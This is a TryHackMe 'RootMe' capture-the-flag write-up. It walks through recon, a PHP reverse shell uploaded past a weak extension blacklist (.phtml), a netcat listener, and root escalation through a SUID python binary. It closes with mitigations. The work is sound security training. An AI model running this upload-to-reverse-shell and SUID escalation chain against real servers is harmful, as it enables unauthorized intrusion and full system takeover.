# RootMe — TryHackMe (Easy)

A beginner CTF: enumerate a web server, upload a web shell to get a foothold, and escalate to root.

> This write-up explains the **method**, not the answers. No flags or passwords are included.

---

## 🎯 Objective

From a single IP, find a way into the web server, get a shell as the web user, and escalate privileges to read both the user and the root flag.

## 🔍 Recon

```
nmap -sV -oN rootme_nmap.txt <IP>   # version detection, saved to a file
```

Open ports:

| Port | Service | Notes |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.41 (Ubuntu) |

SSH is useless without credentials, so the focus is port 80.

## 🧭 Web enumeration

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -o rootme_gobuster.txt
```

Gobuster brute-forces directory names from a wordlist and keeps the ones the server responds to. Reading the status codes matters:

- **200** — exists, served directly (e.g. `index.php`)
- **301** — exists, redirects (real directories, e.g. `/panel`, `/uploads`)
- **403** — exists but forbidden (`.htaccess`, `.htpasswd` — normal, ignore)

Two interesting directories, hidden because nothing links to them:

- `/panel/` — a **file upload** form
- `/uploads/` — where uploaded files land

## 🔑 Access — file upload to reverse shell

The plan: upload a PHP reverse shell, then trigger it from the browser so Apache executes it.

**1. Prepare the payload.** Kali ships one; only the IP and port need editing:

```
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# edit $ip  = <my VPN tun0 IP>
# edit $port = 4444
```

**2. Bypass the upload filter.** The form rejects `.php`, but the filter is a weak blacklist — it only checks for `.php` and forgets other extensions Apache still executes:

```
mv shell.php shell.phtml   # .phtml is executed as PHP
```

**3. Catch the shell.** On the attacker box, open the port and listen:

```
sudo ufw allow 4444        # only if ufw is enabled
nc -lvnp 4444
```

**4. Trigger it** by opening the uploaded file in the browser:

```
http://<IP>/uploads/shell.phtml
```

The victim connects back → shell as **www-data**.

```
python -c 'import pty; pty.spawn("/bin/bash")'   # upgrade to a usable shell
id                                               # uid=33(www-data)
```

Why a reverse shell: firewalls block inbound connections to the victim but allow its outbound traffic, so the victim is made to "call home" instead.

**User flag** — found outside `/home`, in the web root the web user owns:

```
find / -name user.txt 2>/dev/null   # -> /var/www/user.txt
less /var/www/user.txt
```

## 🧗 Privilege escalation — SUID binary

`www-data` has limited rights. Look for binaries with the **SUID** bit, which run with their owner's privileges (root) regardless of who launches them:

```
find / -perm -4000 2>/dev/null
```

Most results are legitimate (`passwd`, `mount`, `su`…). The odd one out is **`python`**: an interpreter with SUID has no business being there, and it can run arbitrary code as root.

Looked up on [GTFOBins](https://gtfobins.github.io/) (the standard catalogue of how to abuse each binary), the SUID entry gives:

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` preserves the elevated privileges. Confirm with `id`:

```
id          # uid=33(www-data) ... euid=0(root)
```

`euid=0` is what counts — effective root. Read the final flag:

```
less /root/root.txt
```

## 📚 What I learned

- Full chain: recon → web enumeration → initial access → privilege escalation.
- Gobuster finds directories by **guessing** names, not by crawling links; "hidden" means unlinked, not unreachable.
- Upload filters that only blacklist `.php` are bypassed with equivalent extensions (`.phtml`, `.php5`…).
- Reverse shell vs bind shell, and why the victim connects back (to get past the firewall).
- A reverse shell often dies on `Ctrl+C` — use it only once the work is saved.
- SUID lets a program run as its owner; an interpreter (python, perl…) with SUID is an instant escalation path.
- `find / -perm -4000` lists SUID binaries; `2>/dev/null` just hides permission-denied noise.
- Not every SUID binary is exploitable — cross-check against GTFOBins or automate with LinPEAS.
- `id` tells you who you are: `euid=0` means effective root.

## 🛡️ Mitigation (blue team view)

- Validate uploads by content, not just extension; use an allow-list, not a blacklist.
- Store uploaded files outside the web root, or in a directory where the server won't execute code.
- Disable directory listing (`/uploads/` should not reveal its contents).
- Remove the SUID bit from interpreters and any binary that doesn't need it (`find / -perm -4000` as an audit).
- Apply least privilege to the web user and keep services patched.
